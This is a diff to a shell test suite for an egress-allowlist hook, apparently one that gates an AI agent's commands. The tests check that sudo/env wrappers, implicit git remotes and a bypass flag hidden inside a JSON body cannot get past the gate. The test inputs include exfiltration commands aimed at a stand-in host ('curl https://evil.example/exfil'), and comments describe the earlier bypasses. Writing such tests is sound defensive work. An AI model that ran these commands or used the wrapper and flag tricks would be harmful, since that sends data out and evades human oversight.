@@ -164,18 +164,154 @@ _call_hook_other() {
   echo "$output" | jq -e '.decision == "block"'
 }
 
-@test "AC-2: git fetch/pull without an explicit remote URL is allow (local config)" {
-  # `git fetch` / `git pull` with no URL reads from local repo config —
-  # the network call ALSO happens, but the host is unknown to us. Per
-  # spec AC-2 (fail-CLOSED on missing host for known network CLIs), we
-  # block. But `git status` / `git log` are local-only and must NOT
-  # trigger the hook even though they share the `git` binary.
+@test "AC-2: local-only git subcommands (status, log, diff, cherry, branch) pass through" {
+  # `git status` / `git log` / `git diff` / `git cherry` / `git branch`
+  # are local-only. `git cherry` (R2 fix B4) was previously misclassified
+  # as a network subcommand and blocked when invoked with no URL — pin
+  # it as local here.
   echo 'github.com' > "$ALLOWLIST"
-  # Local-only git subcommand → allow.
-  run _call_hook_bash 'git status'
+  for cmd in 'git status' 'git log --oneline -5' 'git diff' 'git cherry main' 'git branch -a'; do
+    run _call_hook_bash "$cmd"
+    [ "$status" -eq 0 ]
+    echo "$output" | jq -e '.decision == "allow"' || { echo "expected allow for: $cmd → $output"; return 1; }
+  done
+}
+
+@test "AC-2 (R2): 'git fetch' with no explicit URL → fail-CLOSED block" {
+  # Behavior the previous test NAMED but never asserted. `git fetch`
+  # with no remote uses the configured upstream — implicit host that
+  # the parser can't see. Per spec AC-2, fail-CLOSED.
+  echo 'github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'git fetch'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+  echo "$output" | jq -er '.reason' | grep -qE 'implicit remote|git fetch'
+}
+
+@test "AC-2 (R2 B5): 'git lfs push origin' with no URL → fail-CLOSED block" {
+  # Without B5, `git lfs push origin main` falls to the catch-all ALLOW
+  # branch and bypasses the gate completely. With B5, `lfs` is in the
+  # network subcommand list and fails CLOSED on missing URL.
+  echo 'github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'git lfs push origin main'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (R2 B5): 'git svn fetch' / 'git annex get' fail-CLOSED" {
+  echo 'github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'git svn fetch'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+  run _call_hook_bash 'git annex get bigfile.bin'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (R2 B5): 'git lfs push https://github.com/foo/bar' (allowlisted) → allow" {
+  echo 'github.com' > "$ALLOWLIST"
+  run _call_hook_bash 'git lfs push https://github.com/foo/bar.git main'
   [ "$status" -eq 0 ]
   echo "$output" | jq -e '.decision == "allow"'
-  run _call_hook_bash 'git log --oneline -5'
+}
+
+# ---------------------------------------------------------------------------
+# R2 B1: sudo / env / nice / nohup wrappers must NOT bypass the gate
+# ---------------------------------------------------------------------------
+
+@test "AC-2 (R2 B1): 'sudo curl https://evil.example' is blocked" {
+  : > "$ALLOWLIST"
+  run _call_hook_bash 'sudo curl https://evil.example/exfil'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (R2 B1): 'sudo -E curl https://evil.example' is blocked" {
+  # Without the fix, `-E` was treated as the CLI name → fell to ALLOW.
+  : > "$ALLOWLIST"
+  run _call_hook_bash 'sudo -E curl https://evil.example/exfil'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (R2 B1): 'sudo -u nobody curl https://evil.example' is blocked" {
+  # `-u nobody` is a flag+value pair; the unwrapper must consume both.
+  : > "$ALLOWLIST"
+  run _call_hook_bash 'sudo -u nobody curl https://evil.example/exfil'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (R2 B1): 'env FOO=bar curl https://evil.example' is blocked" {
+  # env-style VAR=VAL assignments before the real CLI must also be
+  # stripped so the parser sees `curl`.
+  : > "$ALLOWLIST"
+  run _call_hook_bash 'env FOO=bar curl https://evil.example/exfil'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+@test "AC-2 (R2 B1): '/usr/bin/env curl https://api.github.com' with allowlist works" {
+  echo 'api.github.com' > "$ALLOWLIST"
+  run _call_hook_bash '/usr/bin/env curl https://api.github.com/repos/foo/bar'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "allow"'
+}
+
+@test "AC-2 (R2 B1): 'sudo -E' with NO followed CLI → fail-CLOSED" {
+  # Pathological: sudo + flag and then EOL. Resulting cli is empty.
+  : > "$ALLOWLIST"
+  run _call_hook_bash 'sudo -E'
+  [ "$status" -eq 0 ]
+  # Empty cli → falls into the unable-to-identify branch (block).
+  echo "$output" | jq -e '.decision == "block"'
+}
+
+# ---------------------------------------------------------------------------
+# R2 W1: IPv6 literal URL host extraction
+# ---------------------------------------------------------------------------
+
+@test "AC-2 (R2 W1): IPv6 literal URL extracts bracketed host (allowlisted)" {
+  echo '[::1]' > "$ALLOWLIST"
+  run _call_hook_bash 'curl http://[::1]:8080/api'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "allow"'
+}
+
+@test "AC-2 (R2 W1): IPv6 literal URL extracts bracketed host (NOT in allowlist)" {
+  # Without W1 fix, [ was returned as the "host", failing CLI validation
+  # with a cryptic error. With the fix, the bracketed literal is treated
+  # as the host and a clean block message comes back.
+  : > "$ALLOWLIST"
+  run _call_hook_bash 'curl http://[fd00::1]/api'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"'
+  echo "$output" | jq -er '.reason' | grep -q 'fd00::1'
+}
+
+# ---------------------------------------------------------------------------
+# R2 B7: bypass flag in command DATA (JSON body) must NOT trigger bypass
+# ---------------------------------------------------------------------------
+
+@test "AC-2 (R2 B7): bypass flag inside a JSON body does NOT trigger bypass" {
+  # The flag must be SPACE-BRACKETED to count as a real CLI token.
+  # In `curl -d '{"x":"--allow-egress-outbound"}' https://evil.example`,
+  # the flag is bracketed by `"` not whitespace, so the regex
+  # `(^|[[:space:]])--allow-egress-outbound([[:space:]]|$)` does NOT
+  # match → bypass does NOT fire → curl-to-evil is BLOCKED.
+  : > "$ALLOWLIST"
+  export WALTER_EGRESS_ALLOW_OVERRIDE=1
+  run _call_hook_bash 'curl -d "{\"flag\":\"--allow-egress-outbound\"}" https://evil.example/exfil'
+  [ "$status" -eq 0 ]
+  echo "$output" | jq -e '.decision == "block"' || { echo "expected block (flag in JSON body), got: $output"; return 1; }
+}
+
+@test "AC-2 (R2 B7): bypass flag as real CLI token DOES trigger bypass" {
+  # The legitimate operator-typed form: `... --allow-egress-outbound`
+  # with whitespace boundary → the bypass DOES fire.
+  : > "$ALLOWLIST"
+  export WALTER_EGRESS_ALLOW_OVERRIDE=1
+  run _call_hook_bash 'curl https://emergency.example/healthcheck --allow-egress-outbound'
   [ "$status" -eq 0 ]
   echo "$output" | jq -e '.decision == "allow"'
 }
